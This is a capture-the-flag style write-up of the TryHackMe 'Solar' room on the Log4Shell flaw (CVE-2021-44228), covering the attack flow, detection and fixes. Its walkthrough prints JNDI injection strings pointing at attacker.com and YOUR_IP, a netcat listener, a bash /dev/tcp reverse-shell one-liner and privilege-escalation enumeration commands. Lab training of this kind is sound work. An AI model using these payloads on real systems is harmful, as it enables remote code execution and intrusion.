🌞 Solar (Log4J) – Full Writeup!

🔹 Overview
This room focuses on the Log4Shell vulnerability in Log4j, a widely used Java logging library.
Vulnerability: Log4Shell
CVE: CVE-2021-44228
Impact: Remote Code Execution (RCE)

🔹 What is Log4j?
A Java logging library used in many applications.
Developers use it to log messages (errors, user input, etc.)
Example:
logger.info("User input: " + username);

🔹 Root Cause of Vulnerability
Log4j supports JNDI lookups (Java Naming and Directory Interface).
Attackers can inject:
${jndi:ldap://attacker.com/exploit}
👉 Log4j will:
Contact attacker server
Download malicious class
Execute it
➡️ Result: Remote Code Execution

🔹 Attack Flow (Important for Exams)
Attacker sends malicious input
Application logs the input
Log4j processes ${jndi:...}
Makes request to attacker-controlled LDAP server
Loads malicious payload
Code executes on victim machine

🔹 Lab Walkthrough

🧪 Step 1: Initial Access
Open the web application provided in TryHackMe
Identify input fields (login, headers, etc.)

🧪 Step 2: Test for Vulnerability
Inject payload:
${jndi:ldap://YOUR_IP:1389/a}
📌 Common injection points:
Username field
HTTP headers (User-Agent)
URL parameters

🧪 Step 3: Set Up Listener (Attacker Machine)
Use tools like:
nc (netcat)
or custom LDAP server
Example:
nc -lvnp 4444

🧪 Step 4: Exploitation
Payload example:
${jndi:ldap://YOUR_IP:1389/Exploit}
If successful:
Target connects back to attacker
Reverse shell obtained

🧪 Step 5: Get Reverse Shell
Example payload:
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
➡️ You now have shell access

🧪 Step 6: Stabilize Shell (Optional)
python3 -c 'import pty; pty.spawn("/bin/bash")'

🧪 Step 7: Privilege Escalation
Typical steps:
Check sudo:
sudo -l
Find SUID binaries:
find / -perm -4000 2>/dev/null
Look for misconfigurations

🔹 Key Indicators of Vulnerability
Application logs user input directly
Uses vulnerable Log4j versions:
2.0 – 2.14.1

🔹 Detection Techniques
1. Log Monitoring
Look for:
${jndi:ldap://
2. Network Monitoring
Outbound LDAP/DNS requests to unknown servers

🔹 Mitigation / Fix
✅ Immediate Fixes:
Upgrade Log4j to:
2.17.0 or later
✅ Temporary Fix:
Remove JNDI lookup:
log4j2.formatMsgNoLookups=true
✅ Network Controls:
Block outbound LDAP traffic

🔹 Real-World Impact
Affected:
Minecraft
Apache servers
Cloud apps
Severity:
🔥 Critical (CVSS 10.0)
